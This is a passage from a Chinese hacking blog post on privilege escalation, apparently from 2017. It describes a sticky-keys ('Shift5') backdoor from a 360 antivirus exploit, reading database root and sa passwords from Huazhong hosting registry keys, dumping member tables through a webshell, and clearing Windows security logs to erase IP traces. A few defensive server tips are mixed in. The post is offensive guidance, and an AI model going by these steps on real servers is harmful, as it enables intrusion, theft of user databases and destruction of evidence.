+<p>会提示3段英文：   360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2   You will get a Shift5 door!   Shift5 Backdoor created!   这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
+<h2 id="华众虚拟主机提权"><a href="#华众虚拟主机提权" class="headerlink" title="华众虚拟主机提权"></a>华众虚拟主机提权</h2><p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞</p>
+<p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p>
+<p>HKEY_LOCAL_MACHINE\SOFTWARE\HZHOST\CONFIG\ HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mysqlpass     root密码 HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss       sa 密码</p>
+<p>c:\windows\temp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p>
+<p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p>
+<p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
+<h2 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h2><p>Access数据库脱库很简单，直接下载数据库即可，mssql数据库可以用shell自带的脱裤功能，找到数据库的连接信息，一般在web.config.asp里，然后连接一</p>
+<p>下SA，找到会员表（UserInfo）就可以了。</p>
+<p>mysql数据库脱库，找到root帐号密码，用PHP大马自己带链接功能连接一下，也自己自己上传PHP脱裤脚本，之后找到目标数据库（数据库名），再找到会员表</p>
+<p>menber进行脱裤即可。</p>
+<h2 id="服务器安全"><a href="#服务器安全" class="headerlink" title="服务器安全"></a>服务器安全</h2><p>命令提示符已被系统管理员停用？ 解决方法：运行→gpedit.msc→用户配置→管理模板→系统，在右侧找到”阻止命令提示符”, 然后双击一下,在”设置”里面选中”未配置” ,最后点击”确定”。</p>
+<p>如何判断服务器的类型？ 解决方法：直接ping服务器ip，看回显信息进行判断</p>
+<p>TTL=32     9X/ME</p>
+<p>TTL=64     linux</p>
+<p>TTL=128    2000X/XP</p>
+<p>TTL=255    UNIX</p>
+<p>为什么有时3389开放却不能连接？ 原因分析：有时候是因为防火墙，把3389转发到其他端口就可以连接了，有的转发后依然是连接不上，那是因为管理员在TCP/IP里设置的端口限制 解决方法：我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，更好的办法是取消端口限制。</p>
+<p>最简单的往服务器上传东西方法是什么？ 本机打开“HFS网络文件服务器”这款工具，把需要上传的工具直接拖进左边第一个框内，复制上面的地址，到服务器里的浏览器访问，就可以下载了</p>
+<p>限制“命令提示符”的运行权限？ 我的电脑（右键）–资源管理器中–点击“工具”按钮，选择“文件夹选项”，切换到“查看”标签，去掉“使用简单文件共享(推荐)”前面的钩，这一步是为</p>
+<p>了让文件的属性菜单中显示“安全”标签，然后进入“c:\windows\system32\”，找到“cmd.exe”，点右键选择“属性”，切换到“安全”标签，将其中“组</p>
+<p>或用户名称”中除了管理员外的所有用户都删除，完成后点“确定”这样当普通用户想运行“命令提示符”的时候将会出现“拒绝访问”的警告框。</p>
+<p>如何更改windows2003最大连接数？ windows2003中的远程桌面功能非常方便，但是初始设置只允许2个用户同时登陆，有些时候因为我在公司连接登陆后断开，同事在家里用其他用户登陆后断开，</p>
+<p>当我再进行连接的时候，总是报错“终端服务超过最大连接数”这时候我和同事都不能登陆，通过以下方法来增加连接数，运行：services.msc，启用license</p>
+<p>logging，别忘了添加完毕后再关闭 License Logging 打开win2k3的控制面板中的“授权”，点“添加许可”输入要改的连接数</p>
+<p>如何清除服务器里的IP记录日志？ 1.我的电脑右键管理–事件查看器–安全性–右键清除所有事件 2.打开我的电脑–C盘–WINDOWS–system32–config–AppEvent.Evt属性–安全–全部都拒绝 3.Klaklog.evt属性–安全–全部都拒绝–SecEvent.Tvt属性–安全–全部都拒绝</p>
+<h2 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h2><p>网上收集！！</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/04/26/提权/">提权技巧</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">Mark</a></p>
+        <p><span>发布时间:</span>2017-04-26, 08:52:55</p>
+        <p><span>最后更新:</span>2017-04-26, 08:57:12</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/04/26/提权/" title="提权技巧">http://yoursite.com/2017/04/26/提权/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2017/04/26/提权/　　作者: Mark" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/04/23/burpsuit爆破后台/">
+                    burpsuit爆破后台
+                </a>
+            </div>
+        
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#常用DOS命令"><span class="toc-number">1.</span> <span class="toc-text">常用DOS命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见杀软"><span class="toc-number">2.</span> <span class="toc-text">常见杀软</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows提权中敏感目录和敏感注册表的利用"><span class="toc-number">3.</span> <span class="toc-text">windows提权中敏感目录和敏感注册表的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权中的敏感注册表位置"><span class="toc-number">4.</span> <span class="toc-text">提权中的敏感注册表位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL语句直接开启3389"><span class="toc-number">5.</span> <span class="toc-text">SQL语句直接开启3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wscript-shell的删除和恢复"><span class="toc-number">6.</span> <span class="toc-text">wscript.shell的删除和恢复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何找到准确的终端连接端口？"><span class="toc-number">7.</span> <span class="toc-text">如何找到准确的终端连接端口？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><span class="toc-number">8.</span> <span class="toc-text">iis6提权提示Can not find wmiprvse.exe的突破方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地溢出提权"><span class="toc-number">9.</span> <span class="toc-text">本地溢出提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mssql提权"><span class="toc-number">10.</span> <span class="toc-text">Mssql提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql提权"><span class="toc-number">11.</span> <span class="toc-text">mysql提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serv-u提权"><span class="toc-number">12.</span> <span class="toc-text">serv-u提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#端口转发"><span class="toc-number">13.</span> <span class="toc-text">端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC反弹提权"><span class="toc-number">14.</span> <span class="toc-text">NC反弹提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#星外提权"><span class="toc-number">15.</span> <span class="toc-text">星外提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#360提权"><span class="toc-number">16.</span> <span class="toc-text">360提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#华众虚拟主机提权"><span class="toc-number">17.</span> <span class="toc-text">华众虚拟主机提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脱库"><span class="toc-number">18.</span> <span class="toc-text">脱库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#服务器安全"><span class="toc-number">19.</span> <span class="toc-text">服务器安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#来源"><span class="toc-number">20.</span> <span class="toc-text">来源</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"提权技巧　| 大佬要我改个名　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/04/23/burpsuit爆破后台/" title="上一篇: burpsuit爆破后台">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/04/26/提权/">提权技巧</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/23/burpsuit爆破后台/">burpsuit爆破后台</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/Cookie欺骗进后台/">cookie 欺骗进后台</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/21/解析漏洞/">解析漏洞总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/18/Http参数污染/">HTTP参数污染</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/15/旁注攻击/">旁注攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/15/文件包含漏洞/">文件包含漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/15/社会工程学/">社会工程学</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/15/暴力破解/">暴力破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/URL跳转与钓鱼/">URL跳转与钓鱼</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/上传篇/">上传篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/逻辑错误漏洞/">逻辑错误漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/CSRF/">CSRF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/10/XSS/">XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/代码注入之XPath篇/">代码注入之XPath篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/代码注入之XML篇/">代码注入之XML篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL注入之nmap/">SQL注入之nmap</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL手工注入之mysql/">SQL手工注入之mysql</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL手工注入之Oracle/">SQL手工注入之Oracle</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL手工注入之Access/">SQL手工注入之Access</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL手工注入之mssql/">SQL手工注入之SQL Server（mssql）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/SQL注入之类型简介/">SQL注入之类型简介</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/信息收集之CMS/">信息收集之CMS</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/信息探测之真实IP查询/">信息收集之真实IP查询</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/信息探测_端口篇/">信息探测之nmap的使用（端口）</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/信息探测_谷歌语法/">信息探测之谷歌黑客语法的使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/漏洞扫描之工具篇/">漏洞扫描之工具使用篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/08/HTTP协议/">HTTP协议</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017 Mark
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
